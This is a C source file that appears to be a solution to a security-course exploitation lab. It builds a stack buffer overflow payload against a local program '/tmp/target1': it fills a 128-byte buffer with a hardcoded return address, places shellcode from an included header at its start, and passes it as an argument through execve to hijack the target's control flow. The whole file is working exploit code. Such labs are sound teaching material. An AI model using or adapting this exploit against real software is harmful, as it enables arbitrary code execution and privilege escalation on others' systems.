#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;

  char buff[128];
  long *long_ptr = (long *) buff;

  int i = 0;
 
  // fill buffer with address of beginning of shellcode
  for( i = 0; i < 32; i++)
     *(long_ptr + i) = 0xbffffdbc;

  // fill beginning of buffer with shellcode
  for(i = 0; i < strlen(shellcode); ++i)
    buff[i] = shellcode[i];

  // args[1] will be overflowed with buffer
  args[1] = buff;   

  args[2] = NULL;
  env[0] = NULL;

if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}